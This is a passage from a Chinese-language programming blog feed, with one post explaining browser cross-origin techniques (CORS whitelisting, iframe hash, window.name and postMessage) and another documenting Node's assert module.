&#123;</div><div class="line">    if (_.isArray(allowedOrigin)) &#123;</div><div class="line">        for(let i = 0; i &lt; allowedOrigin.length; i++) &#123;</div><div class="line">            if(isOriginAllowed(origin, allowedOrigin[i])) &#123;</div><div class="line">                return true;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        return false;</div><div class="line">    &#125; else if (_.isString(allowedOrigin)) &#123;</div><div class="line">        return origin === allowedOrigin;</div><div class="line">    &#125; else if (allowedOrigin instanceof RegExp) &#123;</div><div class="line">        return allowedOrigin.test(origin);</div><div class="line">    &#125; else &#123;</div><div class="line">        return !!allowedOrigin;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">const ALLOW_ORIGIN = [  // 域名白名单</div><div class="line">    &apos;*.233.666.com&apos;,</div><div class="line">    &apos;hello.world.com&apos;,</div><div class="line">    &apos;hello..*.com&apos;</div><div class="line">];</div><div class="line"></div><div class="line">app.post(&apos;a/b&apos;, function (req, res, next) &#123;</div><div class="line">    let reqOrigin = req.headers.origin;  // request响应头的origin属性</div><div class="line"></div><div class="line">    // 判断请求是否在域名白名单内</div><div class="line">    if(isOriginAllowed(reqOrigin, ALLOW_ORIGIN)) &#123;</div><div class="line">        // 设置CORS为请求的Origin值</div><div class="line">        res.header(&quot;Access-Control-Allow-Origin&quot;, reqOrigin);</div><div class="line">        res.header(&apos;Access-Control-Allow-Credentials&apos;, &apos;true&apos;);</div><div class="line"></div><div class="line">        // 业务代码逻辑代码 ...</div><div class="line">        // ...</div><div class="line">    &#125; else &#123;</div><div class="line">        res.send(&#123; code: -2, msg: &apos;非法请求&apos; &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>与JSONP的比较:<br>CORS与JSONP的使用目的相同，但是比JSONP更强大。<br>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
<h3 id="iframe-Hash"><a href="#iframe-Hash" class="headerlink" title="iframe-Hash"></a>iframe-Hash</h3><p>Location 对象是 Window 对象的一个部分，可通过 window.location 属性来访问<br>hash是location对象的的一个属性，可以设置或返回从井号 (#) 开始的 URL（锚）</p>
<p>iframe是HTML标签，作用是文档中的文档，或者浮动的框架(FRAME)。iframe元素会创建包含另外一个文档的内联框架（即行内框架）。</p>
<p>原理是在原域页面包装 跨域src的iframe标签，在跨域src的文件里请求跨域的资源(此时二者同域),<br>跨域src文件是可以获取到iframe父类,即我们原域的window对象,<br>通过改变原域的hash值，引发原域onhashchange,从而将资源带回到原域</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">//原域js</div><div class="line">//包装iframe</div><div class="line">var iframe = document.createElement(&apos;iframe&apos;)</div><div class="line">iframe.src = &apos;http://x.com:7001/public/hash.html&apos;</div><div class="line">document.body.appendChild(iframe)</div><div class="line">//处理请求资源</div><div class="line">window.onhashchange = function () &#123;</div><div class="line">  // 小练习，做个工具方法，取出query的值</div><div class="line">  console.log(location.hash)</div><div class="line">&#125;</div><div class="line"></div><div class="line">//跨域的hash.html文件</div><div class="line"></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;script&gt;</div><div class="line">var xhr = new XMLHttpRequest()</div><div class="line">xhr.onreadystatechange = function () &#123;</div><div class="line">    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;</div><div class="line">        var res = JSON.parse(xhr.responseText)</div><div class="line">        parent.location.href = `http://y.stuq.com:7001/public/3.html#msg=$&#123;res.msg&#125;` //引起原域onhashchange，同时将response带回</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">xhr.open(&apos;GET&apos;, &apos;http://x.com:7001/json&apos;, true) //请求同域资源</div><div class="line">xhr.send(null)</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h3 id="iframe-window-name"><a href="#iframe-window-name" class="headerlink" title="iframe-window.name"></a>iframe-window.name</h3><p>原理是利用iframe的window.name,name 值在不同的页面（甚至不同域名）加载后依旧存在（如果没修改则值不会变化），并且可以支持非常长的 name 值（2MB）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">//原域js</div><div class="line">var iframe = document.createElement(&apos;iframe&apos;)</div><div class="line">iframe.src = &apos;http://x.com:7001/public/name.html&apos;</div><div class="line">document.body.appendChild(iframe)</div><div class="line"></div><div class="line">var times = 0</div><div class="line">iframe.onload = function () &#123;</div><div class="line">    if (++times === 2) &#123;//第一次打开跨域页面name,第二次加载通知原域iframe改变值</div><div class="line">        console.log(JSON.parse(iframe.contentWindow.name))</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//name.html</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;script&gt;</div><div class="line">var xhr = new XMLHttpRequest()</div><div class="line">xhr.onreadystatechange = function () &#123;</div><div class="line">    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;</div><div class="line">        window.name = xhr.responseText //这里是原域iframe的window,iframe不能跨域读取对象,所以</div><div class="line">        location.href = &apos;http://y.com:7001/public/index.html&apos; //再次加载iframe，通知原域parent，iframe的contentWindow.name需要做更改</div><div class="line">        //href的值,依然是跨域的也可以，这里是加载回原域的一个文件</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">xhr.open(&apos;GET&apos;, &apos;http://x.com:7001/json&apos;, true)</div><div class="line">xhr.send(null)</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h3 id="iframe-postMessage"><a href="#iframe-postMessage" class="headerlink" title="iframe-postMessage"></a>iframe-postMessage</h3><p>利用HTML5的postMessage方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">//原域js</div><div class="line">var iframe = document.createElement(&apos;iframe&apos;)</div><div class="line">iframe.src = &apos;http://x.stuq.com:7001/public/post.html&apos;</div><div class="line">document.body.appendChild(iframe)</div><div class="line"></div><div class="line">window.addEventListener(&apos;message&apos;, function(e) &#123;</div><div class="line">  console.log(JSON.parse(e.data))</div><div class="line">&#125;, false);</div><div class="line"></div><div class="line">//post.html</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;script&gt;</div><div class="line">var xhr = new XMLHttpRequest()</div><div class="line">xhr.onreadystatechange = function () &#123;</div><div class="line">    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;</div><div class="line">        parent.postMessage(xhr.responseText, &apos;*&apos;) //拿到父级页面parent,执行postmessage的一个操作，从而引发父级页面的message事件</div><div class="line">        //*代表targetOrigin可以是任何域</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">xhr.open(&apos;GET&apos;, &apos;http://x.stuq.com:7001/json&apos;, true)</div><div class="line">xhr.send(null)</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="external">Window.postMessage() API</a></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>跨域方法很多<br>选择如何使用可以考虑以下几方面<br>1.场景，选择简单的<br>2.安全，解决问题是否足够安全<br>3.数据来源,如果跨域接口可以传资源给原域，则可以使用iframe代理<br>4.承接第三种情景，如果接口不允许传资源，则只能寄希望于后台，使用反向代理的方法获取</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ajax&quot;&gt;&lt;a href=&quot;#ajax&quot; class=&quot;headerlink&quot; title=&quot;ajax&quot;&gt;&lt;/a&gt;ajax&lt;/h1&gt;&lt;p&gt;ajax全称Asynchronous JavaScript and XML（异步的JavaScript与XML），是网页无需
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>断言语句assert</title>
    <link href="http://yoohannah.github.io/post/knowledge/assert.html"/>
    <id>http://yoohannah.github.io/post/knowledge/assert.html</id>
    <published>2017-08-12T15:54:02.000Z</published>
    <updated>2017-08-12T15:54:43.520Z</updated>
    
    <content type="html"><![CDATA[<p>测试用例里面的一种判断语句</p>
<p>在mocha中需要require<br>var assert = require(‘assert’)</p>
<p>参数一般有三个<br>value 待判断的值<br>expected 要和value进行比较的值，看二者是否相等或者不相等,如果没有expected，则是在判断value的值是否为真<br>message 判断结果为错误时,抛出来的错误提醒语句，如果 message 参数为 undefined，则赋予默认的错误信息。</p>
<p>assert(value[, message]) 同assert.ok()<br>assert.ok(value[, message]) value如果不为真值,抛出一个带有 message 属性的 AssertionError</p>
<p>assert.fail(message) 抛出错误信息message</p>
<p>assert.fail(actual, expected, message, operator) 根据参数抛出相应错误信息<br>如果 message 不存在，则错误信息会被设为 actual 的值加分隔符 operator 再加 expected 的值。 否则，错误信息为 message 的值,operator没有的话，默认为!=</p>
<p>assert.ifError(value) 如果 value 为真，则抛出 value,如果为假，则测试通过</p>
<p>assert.equal(actual, expected[, message])      使用相等运算符（==）测试 actual 参数与 expected 参数是否相等。<br>assert.deepEqual(actual, expected[, message])  测试 actual 参数与 expected 参数是否深度相等。 原始值使用 相等运算符（==）比较，只比较可枚举的自身属性。<br>深度相等意味着子对象的可枚举的自身属性也会被比较<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">const obj1 = &#123;</div><div class="line">  a: &#123;</div><div class="line">    b: 1</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">const obj3 = &#123;</div><div class="line">  a: &#123;</div><div class="line">    b: 1</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">const obj4 = Object.create(obj1);</div><div class="line">assert.deepEqual(obj1, obj4);</div><div class="line">// 抛出 AssertionError: &#123; a: &#123; b: 1 &#125; &#125; deepEqual &#123;&#125;</div><div class="line">// 原型会被忽略</div><div class="line">assert.deepEqual(obj1, obj3);</div><div class="line">// 通过，两个对象相等</div></pre></td></tr></table></figure></p>
<p>assert.deepStrictEqual(actual, expected[, message])<br>大多数情况下与 assert.deepEqual() 一样，但有三个例外：</p>
<p>原始值使用 全等运算符（===）比较。使用SameValueZero比较法来比较设置的值及映射的键（也就意味不用考虑caveats）。<br>对象的 原型 也使用 全等运算符 比较。<br>对象的类型标签应该相同。</p>
<p>assert.notEqual(actual, expected[, message])              使用 不等运算符（!=）测试是否不相等。<br>assert.notDeepEqual(actual, expected[, message])          测试是否不深度相等。 与 assert.deepEqual() 相反。<br>assert.notStrictEqual(actual, expected[, message])        使用 不全等运算符（!==）测试是否不全等。<br>assert.notDeepStrictEqual(actual, expected[, message])    测试是否不深度全等。 与 assert.deepStrictEqual() 相反。</p>
<p>assert.throws(block[, error][, message])   期望 block 函数抛出错误error，如果block(function)抛出error的错误，则测试通过<br>error 可以是构造函数、正则表达式、或自定义的验证函数。</p>
<p>assert.doesNotThrow(block[, error][, message])  断言 block 函数不会抛出错误<br>当 assert.doesNotThrow() 被调用时，它会立即调用 block 函数。<br>如果抛出错误且错误类型与 error 参数指定的相同，则抛出 AssertionError。 如果错误类型不相同，或 error 参数是 undefined，则错误会被抛回给调用者。<br>如果block不抛出错误，则测试通过</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;测试用例里面的一种判断语句&lt;/p&gt;
&lt;p&gt;在mocha中需要require&lt;br&gt;var assert = require(‘assert’)&lt;/p&gt;
&lt;p&gt;参数一般有三个&lt;br&gt;value 待判断的值&lt;br&gt;expected 要和value进行比较的值，看二者是否相等或者
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
</feed>
